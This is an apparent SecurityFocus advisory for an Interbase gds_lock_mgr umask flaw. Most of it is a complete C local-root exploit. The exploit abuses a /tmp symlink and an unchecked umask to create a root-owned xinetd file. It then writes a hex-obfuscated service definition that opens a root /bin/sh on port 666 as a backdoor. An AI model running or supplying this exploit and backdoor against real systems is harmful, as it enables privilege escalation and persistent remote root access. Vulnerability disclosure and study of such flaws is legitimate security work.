source: http://www.securityfocus.com/bid/5805/info

Interbase is a SQL database distributed and maintained by Borland. It is available for Unix and Linux operating systems.

The gds_lock_mgr program within Interbase is typically installed setuid. This program does not properly handle user-supplied umasks, and may allow the creation of files with insecure permissions as a privileged user.


// gds_lock_mgr easy local root compromise
// All cobalt Linux affected, and certain mandrake installations.
// Wouter ter Maat aka grazer - http://www.i-security.nl

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>

#define BDPATH "/etc/xinetd.d/xinetdbd"
#define GDSBIN "/opt/interbase/bin/gds_lock_mgr"

int main() {

struct utsname buf;
char path[24], lnc[34];
 
FILE *fd;

/* check for a rootshell on port 666 after the machine has rebooted.
 * exploit written to work on a raq550 using xinetd
 */

char *hexbd = "\x73\x65\x72\x76\x69\x63\x65\x20\x78\x69\x6e\x65\x74\x64"
              "\x62\x64\n\x7b\n\x64\x69\x73\x61\x62\x6c\x65\x20\x3d\x20"
              "\x6e\x6f\n\x70\x72\x6f\x74\x6f\x63\x6f\x6c\x20\x3d\x20\x36"
              "\x36\x36\n\x73\x6f\x63\x6b\x65\x74\x5f\x74\x79\x70\x65\x20"
              "\x3d\x20\x73\x74\x72\x65\x61\x6d\n\x77\x61\x69\x74\x20\x3d"
              "\x20\x6e\x6f\n\x75\x73\x65\x72\x20\x3d\x20\x72\x6f\x6f\x74"
              "\n\x73\x65\x72\x76\x65\x72\x20\x3d\x20\x2f\x62\x69\x6e\x2f"
              "\x73\x68\n\x73\x65\x72\x76\x65\x72\x5f\x61\x72\x67\x73\x20"
              "\x3d\x20\x2d\x69\n\x7d\n";

fprintf(stdout, "*** gds_lock_mgr local root exploit - grazer ***\n");

uname(&buf);
setenv("INTERBASE", "/tmp", 1); 
sprintf(path, "%s", "/tmp/isc_init1.");
strcat(path, buf.nodename);

chdir("/tmp");
umask(000);

sprintf(lnc, "ln %s -s %s", BDPATH, path);
system(lnc);

if(fd=fopen(GDSBIN, "r")) {
system(GDSBIN); close(fd); }
else {
fprintf(stderr, "%s not found...\n", GDSBIN); 
exit(0); }

if(fd=fopen(BDPATH, "w")) { 
fprintf(stderr,"     exploit succesfull...\n");
fprintf(fd, "%s", hexbd); close(fd);}
else {
fprintf(stderr, "exploit failed...\n"); 
exit(0); }

}

